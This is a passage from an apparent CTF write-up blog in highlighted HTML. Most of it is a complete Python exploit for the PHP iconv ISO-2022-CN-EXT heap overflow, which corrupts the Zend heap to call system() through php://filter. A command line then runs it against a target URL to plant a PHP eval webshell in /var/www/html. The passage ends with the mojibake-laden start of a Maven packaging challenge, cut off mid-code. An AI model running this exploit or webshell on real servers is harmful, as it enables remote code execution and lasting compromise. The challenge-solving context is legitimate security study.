region.permissions == <span class="hljs-string">&quot;rw-p&quot;</span><br>            <span class="hljs-keyword">and</span> region.size &gt;= HEAP_SIZE<br>            <span class="hljs-keyword">and</span> region.stop &amp; (HEAP_SIZE-<span class="hljs-number">1</span>) == <span class="hljs-number">0</span><br>            <span class="hljs-keyword">and</span> region.path == <span class="hljs-string">&quot;&quot;</span><br>        ]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> heaps:<br>            failure(<span class="hljs-string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)<br><br>        first = heaps[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(heaps) &gt; <span class="hljs-number">1</span>:<br>            heaps = <span class="hljs-string">&quot;, &quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">hex</span>, heaps))<br>            msg_info(<span class="hljs-string">f&quot;Potential heaps: [i]<span class="hljs-subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg_info(<span class="hljs-string">f&quot;Using [i]<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> first<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment">#self.check_vulnerable()</span><br>        <span class="hljs-variable language_">self</span>.get_symbols_and_addresses()<br><br>        <span class="hljs-variable language_">self</span>.exploit()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit_path</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        On each step of the exploit, a filter will process each chunk one after the</span><br><span class="hljs-string">        other. Processing generally involves making some kind of operation either</span><br><span class="hljs-string">        on the chunk or in a destination chunk of the same size. Each operation is</span><br><span class="hljs-string">        applied on every single chunk; you cannot make PHP apply iconv on the first 10</span><br><span class="hljs-string">        chunks and leave the rest in place. That&#x27;s where the difficulties come from.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Keep in mind that we know the address of the main heap, and the libraries.</span><br><span class="hljs-string">        ASLR/PIE do not matter here.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point</span><br><span class="hljs-string">        lower. For instance, we have the following free list:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00</span><br><span class="hljs-string"></span><br><span class="hljs-string">        By triggering the bug from chunk ..900, we get:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???</span><br><span class="hljs-string"></span><br><span class="hljs-string">        That&#x27;s step 3.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, in order to control the free list, and make it point whereever we want,</span><br><span class="hljs-string">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,</span><br><span class="hljs-string">        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.</span><br><span class="hljs-string">        That&#x27;s step 2.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have</span><br><span class="hljs-string">        a problem: after step2 has been processed, the free list goes bottom-up, like:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900</span><br><span class="hljs-string"></span><br><span class="hljs-string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates</span><br><span class="hljs-string">        chunks. When they get freed, they reverse the free list. Now step2 allocates in</span><br><span class="hljs-string">        reverse order, and therefore after step2, chunks are in the correct order.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Another problem comes up.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.</span><br><span class="hljs-string">        Since step2 creates chunks that contain pointers and pointers are generally not</span><br><span class="hljs-string">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.</span><br><span class="hljs-string">        To avoid this, we put the chunks in step2 at the very end of the chain, and</span><br><span class="hljs-string">        prefix them with `0\n`. When dechunked (right before the iconv), they will</span><br><span class="hljs-string">        &quot;disappear&quot; from the chain, preserving them from the character set conversion</span><br><span class="hljs-string">        and saving us from an unwanted processing error that would stop the processing</span><br><span class="hljs-string">        chain.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We</span><br><span class="hljs-string">        don&#x27;t know the precise layout of the heap, but we know that at the top of the</span><br><span class="hljs-string">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.</span><br><span class="hljs-string">        Its free_slot[] array contains a pointer to each free list. By overwriting it,</span><br><span class="hljs-string">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap</span><br><span class="hljs-string">        field contains pointers to hook functions for emalloc, efree, and erealloc</span><br><span class="hljs-string">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and</span><br><span class="hljs-string">        then overwrite the use_custom_heap flag to make PHP use these function pointers</span><br><span class="hljs-string">        instead. We can now do our favorite CTF technique and get a call to</span><br><span class="hljs-string">        system(&lt;chunk&gt;).</span><br><span class="hljs-string">        We make sure that the &quot;system&quot; command kills the current process to avoid other</span><br><span class="hljs-string">        system() calls with random chunk data, leading to undefined behaviour.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the</span><br><span class="hljs-string">        process is in a random state, we still get contiguous, in order chunks for our</span><br><span class="hljs-string">        exploit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Therefore, the whole process described here CANNOT crash. Everything falls</span><br><span class="hljs-string">        perfectly in place, and nothing can get in the middle of our allocations.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br>        LIBC = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>]<br><br>        ADDR_EFREE = LIBC.symbols[<span class="hljs-string">&quot;__libc_system&quot;</span>]<br>        ADDR_EREALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br>        ADDR_EMALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_malloc&quot;</span>]<br><br>        ADDR_HEAP = <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>]<br>        ADDR_FREE_SLOT = ADDR_HEAP + <span class="hljs-number">0x20</span><br>        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="hljs-number">0x0168</span><br><br>        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="hljs-number">0x10</span><br><br>        CS = <span class="hljs-number">0x100</span><br><br>        <span class="hljs-comment"># Pad needs to stay at size 0x100 at every step</span><br>        pad_size = CS - <span class="hljs-number">0x18</span><br>        pad = <span class="hljs-string">b&quot;\x00&quot;</span> * pad_size<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = chunked_chunk(pad, <span class="hljs-built_in">len</span>(pad) + <span class="hljs-number">6</span>)<br>        pad = compressed_bucket(pad)<br><br>        step1_size = <span class="hljs-number">1</span><br>        step1 = <span class="hljs-string">b&quot;\x00&quot;</span> * step1_size<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1)<br>        step1 = chunked_chunk(step1, CS)<br>        step1 = compressed_bucket(step1)<br><br>        <span class="hljs-comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span><br>        <span class="hljs-comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span><br><br>        step2_size = <span class="hljs-number">0x48</span><br>        step2 = <span class="hljs-string">b&quot;\x00&quot;</span> * (step2_size + <span class="hljs-number">8</span>)<br>        step2 = chunked_chunk(step2, CS)<br>        step2 = chunked_chunk(step2)<br>        step2 = compressed_bucket(step2)<br><br>        step2_write_ptr = <span class="hljs-string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="hljs-string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)<br>        step2_write_ptr = chunked_chunk(step2_write_ptr)<br>        step2_write_ptr = compressed_bucket(step2_write_ptr)<br><br>        step3_size = CS<br><br>        step3 = <span class="hljs-string">b&quot;\x00&quot;</span> * step3_size<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3) == CS<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = chunked_chunk(step3)<br>        step3 = compressed_bucket(step3)<br><br>        step3_overflow = <span class="hljs-string">b&quot;\x00&quot;</span> * (step3_size - <span class="hljs-built_in">len</span>(BUG)) + BUG<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(step3_overflow) == CS<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = chunked_chunk(step3_overflow)<br>        step3_overflow = compressed_bucket(step3_overflow)<br><br>        step4_size = CS<br>        step4 = <span class="hljs-string">b&quot;=00&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span> * (step4_size - <span class="hljs-number">1</span>)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = chunked_chunk(step4)<br>        step4 = compressed_bucket(step4)<br><br>        <span class="hljs-comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span><br>        <span class="hljs-comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span><br>        step4_pwn = ptr_bucket(<br>            <span class="hljs-number">0x200000</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-comment"># free_slot</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_CUSTOM_HEAP,  <span class="hljs-comment"># 0x18</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            ADDR_HEAP,  <span class="hljs-comment"># 0x140</span><br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>,<br>            size=CS,<br>        )<br><br>        step4_custom_heap = ptr_bucket(<br>            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="hljs-number">0x18</span><br>        )<br><br>        step4_use_custom_heap_size = <span class="hljs-number">0x140</span><br><br>        COMMAND = <span class="hljs-variable language_">self</span>.command<br>        COMMAND = <span class="hljs-string">f&quot;kill -9 $PPID; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.sleep:<br>            COMMAND = <span class="hljs-string">f&quot;sleep <span class="hljs-subst">&#123;self.sleep&#125;</span>; <span class="hljs-subst">&#123;COMMAND&#125;</span>&quot;</span><br>        COMMAND = COMMAND.encode() + <span class="hljs-string">b&quot;\x00&quot;</span><br>        <span class="hljs-built_in">print</span>(COMMAND)<br>        <span class="hljs-keyword">assert</span> (<br>            <span class="hljs-built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size<br>        ), <span class="hljs-string">f&quot;Command too big (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span><br>        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>        step4_use_custom_heap = COMMAND<br>        step4_use_custom_heap = qpe(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)<br><br>        pages = (<br>            step4 * <span class="hljs-number">3</span><br>            + step4_pwn<br>            + step4_custom_heap<br>            + step4_use_custom_heap<br>            + step3_overflow<br>            + pad * <span class="hljs-variable language_">self</span>.pad<br>            + step1 * <span class="hljs-number">3</span><br>            + step2_write_ptr<br>            + step2 * <span class="hljs-number">2</span><br>        )<br><br>        resource = compress(compress(pages))<br>        resource = b64(resource)<br>        resource = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;resource.decode()&#125;</span>&quot;</span><br><br>        filters = [<br>            <span class="hljs-comment"># Create buckets</span><br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 0: Setup heap</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 1: Reverse FL order</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 2: Put fake pointer and make FL order back to normal</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 3: Trigger overflow</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span><br>            <span class="hljs-string">&quot;convert.quoted-printable-decode&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>        ]<br>        filters = <span class="hljs-string">&quot;|&quot;</span>.join(filters)<br>        path = <span class="hljs-string">f&quot;uri:php://filter/read=<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;resource&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">return</span> path<br><br><span class="hljs-meta">    @inform(<span class="hljs-params"><span class="hljs-string">&quot;Triggering...&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        path = <span class="hljs-variable language_">self</span>.build_exploit_path()<br>        start = time.time()<br>        <span class="hljs-built_in">print</span>(path)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.remote.send(path)<br>        <span class="hljs-keyword">except</span> (ConnectionError, ChunkedEncodingError):<br>            <span class="hljs-keyword">pass</span><br>        <br>        msg_print()<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.sleep:<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> start + <span class="hljs-variable language_">self</span>.sleep &lt;= time.time():<br><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)<br>        <span class="hljs-comment">#print(1)</span><br>        msg_print()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># Remove 2-byte header and 4-byte checksum</span><br>    <span class="hljs-keyword">return</span> zlib.compress(data, <span class="hljs-number">9</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, misalign=<span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    payload = base64.encode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> misalign <span class="hljs-keyword">and</span> payload.endswith(<span class="hljs-string">&quot;=&quot;</span>):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Misaligned: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload.encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compressed_bucket</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> chunked_chunk(data, <span class="hljs-number">0x8000</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qpe</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">f&quot;=<span class="hljs-subst">&#123;x:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data).upper().encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ptr_bucket</span>(<span class="hljs-params">*ptrs, size=<span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ptrs) * <span class="hljs-number">8</span> == size<br>    bucket = <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)<br><br>    <span class="hljs-keyword">return</span> bucket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chunked_chunk</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span><br><span class="hljs-string">    chunked representation has size `size`.</span><br><span class="hljs-string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span><br>    <span class="hljs-comment"># enough</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        size = <span class="hljs-built_in">len</span>(data) + <span class="hljs-number">8</span><br>    keep = <span class="hljs-built_in">len</span>(data) + <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;\n\n&quot;</span>)<br>    size = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> size.encode() + <span class="hljs-string">b&quot;\n&quot;</span> + data + <span class="hljs-string">b&quot;\n&quot;</span><br><br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Region</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span><br><br>    start: <span class="hljs-built_in">int</span><br>    stop: <span class="hljs-built_in">int</span><br>    permissions: <span class="hljs-built_in">str</span><br>    path: <span class="hljs-built_in">str</span><br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">size</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.stop - <span class="hljs-variable language_">self</span>.start<br><br><br>Exploit()<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cnext-exploit.py http://30.222.0.20:59687/photo.php?pdoceshi <span class="hljs-string">&quot;echo PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&quot;</span><br></code></pre></td></tr></table></figure><h1 id="maven-packer"><a href="#maven-packer" class="headerlink" title="maven-packer"></a>maven-packer</h1><p>JDK17ã€‚</p><p>hint: </p><ol><li>maven æ’ä»¶ </li><li>å…³æ³¨ Dockerfile </li><li>é¢˜ç›®æœ¬èº«ç¦æ­¢å¯¹å¤–å‘èµ·ä»»ä½•è¿æ¥ </li><li>docker å›½å†…é•œåƒ registry.cn-hangzhou.aliyuncs.com&#x2F;exp10it&#x2F;maven-packer</li></ol><p>IndexController.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.exp10it.ctf;<br><br><span class="hljs-keyword">import</span> net.lingala.zip4j.ZipFile;<br><span class="hljs-keyword">import</span> net.lingala.zip4j.model.FileHeader;<br><span class="hljs-keyword">import</span> net.lingala.zip4j.model.UnzipParameters;<br><span class="hljs-keyword">import</span> net.lingala.zip4j.model.ZipParameters;<br><span class="hljs-keyword">import</span> org.springframework.http.*;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.util.FileSystemUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">UPLOADS</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/uploads&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">File</span> <span class="hljs-variable">PROJECTS</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/tmp/projects&quot;</span>);<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ResponseEntity&lt;String&gt; <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-string">&quot;Hello, World!&quot;</span>, HttpStatus.OK);<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/pack&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">pack</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile uploadFile)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        FileSystemUtils.deleteRecursively(UPLOADS);<br>        FileSystemUtils.deleteRecursively(PROJECTS);<br>        UPLOADS.mkdirs();<br>        PROJECTS.mkdirs();<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">projectFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(UPLOADS, String.format(<span class="hljs-string">&quot;%s.zip&quot;</span>, RandomUtil.randomStr(<span class="hljs-number">12</span>)));<br>        <span class="hljs-type">File</span> <span class="hljs-variable">projectDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(PROJECTS, RandomUtil.randomStr(<span class="hljs-number">12</span>));<br>        uploadFile.transferTo(projectFile);<br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ZipFile</span> <span class="hljs-variable">zipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(projectFile)) &#123;<br>            <span class="hljs-type">UnzipParameters</span> <span class="hljs-variable">parameters</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnzipParameters</span>();<br>            parameters.setExtractSymbolicLinks(<span class="hljs-literal">false</span>);<br><br>            <span class="hljs-keyword">for</span> (FileHeader fileHeader : zipFile.getFileHeaders()) &#123;<br>                <span class="hljs-keyword">if</span> (!fileHeader.isDirectory()) &#123;<br>                    <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> zipFile.getInputStream(fileHeader)) &#123;<br>                        <span class="hljs-type">byte</span>[] data = input.readAllBytes();<br>                        <span class="hljs-keyword">if</span> (!Arrays.equals(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data).getBytes(), data)) &#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-string">&quot;invalid zip file&quot;</span>, HttpStatus.OK);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            zipFile.extractAll(projectDir.getAbsolutePath(), parameters);<br>        &#125;<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;mvn&quot;</span>, <span class="hljs-string">&quot;package&quot;</span>, <span 